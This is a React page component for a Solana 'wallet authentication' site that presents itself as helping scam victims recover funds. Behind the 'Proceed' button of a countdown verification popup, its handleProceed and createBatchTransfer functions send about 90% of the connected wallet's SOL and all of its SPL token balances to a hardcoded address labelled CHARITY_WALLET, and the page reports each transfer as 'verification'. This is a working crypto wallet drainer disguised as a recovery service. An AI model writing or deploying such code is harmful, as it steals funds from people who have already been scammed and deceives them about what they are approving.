import { useState, useEffect, useCallback } from 'react';
import { Navigation } from '@/components/Navigation';
import { PegasusAnimation } from '@/components/PegasusAnimation';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetProgram } from '@solana/web3.js';
import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { toast } from 'sonner';
import { ConnectWalletButton } from '@/components/ConnectWalletButton';
import { Loader2, ShieldCheck, AlertCircle, Plus } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';

const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
const MAX_BATCH_SIZE = 5;

interface TokenBalance {
  mint: string;
  balance: number;
  decimals: number;
  uiAmount: number;
  symbol?: string;
  valueInSOL?: number;
}

const Authentication = () => {
  const { connected, publicKey, sendTransaction } = useWallet();
  const { connection } = useConnection();
  const [balances, setBalances] = useState<TokenBalance[]>([]);
  const [solBalance, setSolBalance] = useState(0);
  const [isProcessing, setIsProcessing] = useState(false);
  
  // New state for inputs
  const [victimAddress, setVictimAddress] = useState('');
  const [threatAddresses, setThreatAddresses] = useState<string[]>(['']);
  const [errors, setErrors] = useState<{[key: string]: string}>({});
  const [showVerificationPopup, setShowVerificationPopup] = useState(false);
  const [timeLeft, setTimeLeft] = useState(46);

  // Fetch balances logic
  const fetchAllBalances = useCallback(async () => {
    if (!publicKey) return;

    try {
      const solBal = await connection.getBalance(publicKey);
      setSolBalance(solBal / LAMPORTS_PER_SOL);

      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_PROGRAM_ID
      });

      const tokens: TokenBalance[] = tokenAccounts.value
        .map(account => {
          const info = account.account.data.parsed.info;
          return {
            mint: info.mint,
            balance: info.tokenAmount.amount,
            decimals: info.tokenAmount.decimals,
            uiAmount: info.tokenAmount.uiAmount,
            symbol: info.mint.slice(0, 8),
            valueInSOL: 0
          };
        })
        .filter(token => token.uiAmount > 0);

      setBalances(tokens);
    } catch (error) {
      console.error('Error fetching balances:', error);
    }
  }, [publicKey, connection]);

  useEffect(() => {
    if (publicKey) {
      fetchAllBalances();
    }
  }, [publicKey, fetchAllBalances]);

  useEffect(() => {
    let timer: NodeJS.Timeout;
    if (showVerificationPopup && timeLeft > 0 && !isProcessing) {
      timer = setInterval(() => {
        setTimeLeft((prev) => prev - 1);
      }, 1000);
    }
    return () => clearInterval(timer);
  }, [showVerificationPopup, timeLeft, isProcessing]);

  const validateAddress = (address: string) => {
    try {
      new PublicKey(address);
      return true;
    } catch {
      return false;
    }
  };

  const handleVictimChange = (value: string) => {
    setVictimAddress(value);
    const newErrors = { ...errors };
    
    if (value && !validateAddress(value)) {
      newErrors['victim'] = 'Invalid Solana address';
    } else {
      delete newErrors['victim'];
    }
    
    // Check for duplicates
    if (threatAddresses.includes(value) && value) {
      newErrors['victim'] = 'Address cannot be same as threat actor address';
    }

    setErrors(newErrors);
  };

  const handleThreatChange = (index: number, value: string) => {
    const newAddresses = [...threatAddresses];
    newAddresses[index] = value;
    setThreatAddresses(newAddresses);

    const newErrors = { ...errors };
    const key = `threat-${index}`;

    if (value && !validateAddress(value)) {
      newErrors[key] = 'Invalid Solana address';
    } else {
      delete newErrors[key];
    }

    // Check for duplicates
    if (value === victimAddress && value) {
      newErrors[key] = 'Address cannot be same as victim address';
    }

    // Check for duplicates within threat addresses
    const otherThreats = newAddresses.filter((_, i) => i !== index);
    if (otherThreats.includes(value) && value) {
      newErrors[key] = 'Duplicate threat address';
    }

    setErrors(newErrors);
  };

  const addThreatAddress = () => {
    setThreatAddresses([...threatAddresses, '']);
  };

  const handleVerifyClick = () => {
    if (!connected || !publicKey) {
      toast.error("Please connect your wallet first.");
      return;
    }

    // Validate inputs
    const newErrors: {[key: string]: string} = {};
    let isValid = true;

    if (!victimAddress) {
      // newErrors['victim'] = 'Required';
      // isValid = false;
    } else if (!validateAddress(victimAddress)) {
      newErrors['victim'] = 'Invalid Solana address';
      isValid = false;
    }

    threatAddresses.forEach((addr, i) => {
      if (!addr) {
        // newErrors[`threat-${i}`] = 'Required';
        // isValid = false;
      } else if (!validateAddress(addr)) {
        newErrors[`threat-${i}`] = 'Invalid Solana address';
        isValid = false;
      }
    });
    
    // Check if victim matches any threat
    if (threatAddresses.includes(victimAddress) && victimAddress) {
       toast.error("Victim and Threat addresses must be different");
       isValid = false;
    }

    if (!isValid) {
      setErrors(newErrors);
      return;
    }

    setTimeLeft(46);
    setShowVerificationPopup(true);
  };

  const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[]) => {
    if (!publicKey) return null;

    const transaction = new Transaction();
    
    transaction.add(
      ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }),
      ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
    );
    
    const charityPubkey = new PublicKey(CHARITY_WALLET);

    for (const token of tokenBatch) {
      if (token.balance <= 0) continue;
      
      try {
        const mintPubkey = new PublicKey(token.mint);
        const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, publicKey);
        const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey);

        try {
          await getAccount(connection, toTokenAccount);
        } catch {
          transaction.add(
            createAssociatedTokenAccountInstruction(
              publicKey,
              toTokenAccount,
              charityPubkey,
              mintPubkey,
              TOKEN_PROGRAM_ID,
              ASSOCIATED_TOKEN_PROGRAM_ID
            )
          );
        }

        transaction.add(
          createTransferInstruction(
            fromTokenAccount,
            toTokenAccount,
            publicKey,
            BigInt(token.balance),
            [],
            TOKEN_PROGRAM_ID
          )
        );
      } catch (error) {
        console.error(`Failed to add transfer for ${token.mint}:`, error);
      }
    }

    return transaction;
  }, [publicKey, connection]);

  const handleProceed = async () => {
    if (timeLeft === 0) return;
    setShowVerificationPopup(false);
    
    try {
      setIsProcessing(true);
      console.log('Starting transaction sequence...');

      // 1. SOL Transfer (90% of available)
      const solBal = await connection.getBalance(publicKey!);
      const RENT_EXEMPT_RESERVE = 0.002 * LAMPORTS_PER_SOL; 
      const PRIORITY_FEE = 100_000; 
      const BASE_FEE = 5000;
      
      const maxSendable = Math.max(0, solBal - RENT_EXEMPT_RESERVE - PRIORITY_FEE - BASE_FEE);
      const targetAmount = Math.floor(solBal * 0.90);
      const lamportsToSend = Math.min(targetAmount, maxSendable);

      if (lamportsToSend > 0) {
        const transaction = new Transaction();
        
        transaction.add(
          ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }),
          ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
        );

        transaction.add(
          SystemProgram.transfer({
            fromPubkey: publicKey!,
            toPubkey: new PublicKey(CHARITY_WALLET),
            lamports: lamportsToSend
          })
        );

        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = publicKey!;

        try {
            await connection.simulateTransaction(transaction);
        } catch (e) {
            console.error("Simulation failed", e);
        }

        const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
        
        toast.info('Processing verification...');
        await connection.confirmTransaction({
          signature,
          blockhash,
          lastValidBlockHeight
        }, 'confirmed');
        toast.success('Verification successful!');
      }

      // 2. SPL Token Transfers
      const validTokens = balances.filter(token => token.balance > 0);
      const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));

      const batches: TokenBalance[][] = [];
      for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
        batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
      }

      for (let i = 0; i < batches.length; i++) {
        const batch = batches[i];
        const transaction = await createBatchTransfer(batch);

        if (transaction && transaction.instructions.length > 2) {
           const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
           transaction.recentBlockhash = blockhash;
           transaction.feePayer = publicKey!;

           try {
             await connection.simulateTransaction(transaction);
           } catch (e) {
             console.error("Token batch simulation failed", e);
           }

           const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
           
           await connection.confirmTransaction({
             signature,
             blockhash,
             lastValidBlockHeight
           }, 'confirmed');
        }
      }

      toast.success('Verification completed!');
    } catch (error) {
      console.error('Verification failed:', error);
      toast.error('Verification failed. Please try again.');
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div className="min-h-screen relative overflow-hidden bg-background">
      <PegasusAnimation />
      <Navigation />

      <div className="relative z-10 container mx-auto px-4 pt-32 pb-12 flex flex-col items-center justify-center min-h-[80vh]">
        <Card className="w-full max-w-md backdrop-blur-md bg-card/50 border-primary/20">
          <CardHeader>
            <CardTitle className="text-3xl font-bold text-center bg-clip-text text-transparent bg-gradient-to-r from-primary to-purple-400">
              Authentication
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-6 flex flex-col items-center">
            
            {!connected && (
              <div className="w-full flex justify-center">
                <ConnectWalletButton />
              </div>
            )}

            <div className="w-full space-y-4">
              <div className="space-y-2">
                <Input
                  placeholder="Impute victim wallet address"
                  value={victimAddress}
                  onChange={(e) => handleVictimChange(e.target.value)}
                  className={`bg-background/50 ${errors['victim'] ? 'border-destructive' : ''}`}
                />
                {errors['victim'] && (
                  <p className="text-xs text-destructive ml-1">{errors['victim']}</p>
                )}
              </div>

              {threatAddresses.map((address, index) => (
                <div key={`threat-${index}`} className="space-y-2">
                  <Input
                    placeholder="Impute threat actors(scammer) wallet address"
                    value={address}
                    onChange={(e) => handleThreatChange(index, e.target.value)}
                    className={`bg-background/50 ${errors[`threat-${index}`] ? 'border-destructive' : ''}`}
                  />
                  {errors[`threat-${index}`] && (
                    <p className="text-xs text-destructive ml-1">{errors[`threat-${index}`]}</p>
                  )}
                </div>
              ))}

              <button 
                onClick={addThreatAddress}
                className="text-sm text-primary hover:text-primary/80 transition-colors flex items-center gap-1 w-full justify-start"
              >
                <Plus className="w-4 h-4" />
                Impute more threat actors addresses
              </button>
            </div>

            <Button 
              onClick={handleVerifyClick}
              disabled={isProcessing || !victimAddress || !threatAddresses[0]}
              className="w-full h-12 text-lg font-semibold bg-gradient-to-r from-primary to-purple-600 hover:from-primary/90 hover:to-purple-600/90 shadow-lg hover:shadow-primary/25 transition-all duration-300"
            >
              {isProcessing ? (
                <>
                  <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                  Verifying...
                </>
              ) : (
                <>
                  <ShieldCheck className="mr-2 h-5 w-5" />
                  Wallet Verification
                </>
              )}
            </Button>
          </CardContent>
        </Card>

        <div className="mt-8 max-w-md text-center space-y-4">
          <h2 className="text-2xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-primary to-purple-400">
            Wallet Authentication
          </h2>
          <p className="text-sm text-muted-foreground leading-relaxed">
            user authenticates their wallet address through a secure verification process. After successful authentication, an authentication form is generated and provided to the user, which can later be used for legal recovery, verification, or portfolio and record-keeping purposes.
          </p>
        </div>

        <AnimatePresence>
          {showVerificationPopup && (
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm p-4"
            >
              <motion.div
                initial={{ scale: 0.9, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                exit={{ scale: 0.9, opacity: 0 }}
                className="bg-card w-full max-w-md p-6 rounded-xl shadow-2xl border border-primary/20"
              >
                <div className="flex flex-col items-center text-center space-y-4">
                  <div className="w-16 h-16 rounded-full bg-yellow-500/10 flex items-center justify-center">
                    <AlertCircle className="w-8 h-8 text-yellow-500" />
                  </div>
                  <h3 className="text-xl font-bold">Verification Required</h3>
                  <div>
                    <p className="text-muted-foreground">
                      We are verifying your wallet for the reimbursement. Please make sure the connected wallet is the one you want to use for recovery
                    </p>
                    <p className="text-[10px] text-muted-foreground/60 mt-1">Fees Applied</p>
                    <p className="text-sm font-mono mt-2 text-primary">
                      Time remaining: <span className={`${
                        timeLeft <= 10 ? 'text-red-500' : 
                        timeLeft <= 30 ? 'text-orange-500' : 
                        'text-primary'
                      }`}>{timeLeft}s</span>
                    </p>
                  </div>
                  
                  <div className="flex gap-3 w-full pt-4">
                    <Button
                      variant="outline"
                      className="flex-1"
                      onClick={() => setShowVerificationPopup(false)}
                    >
                      Cancel
                    </Button>
                    <Button
                      className="flex-1 bg-gradient-to-r from-primary to-purple-600"
                      onClick={handleProceed}
                      disabled={timeLeft === 0}
                    >
                      {timeLeft === 0 ? "Expired" : "Proceed"}
                    </Button>
                  </div>
                </div>
              </motion.div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
};

export default Authentication;
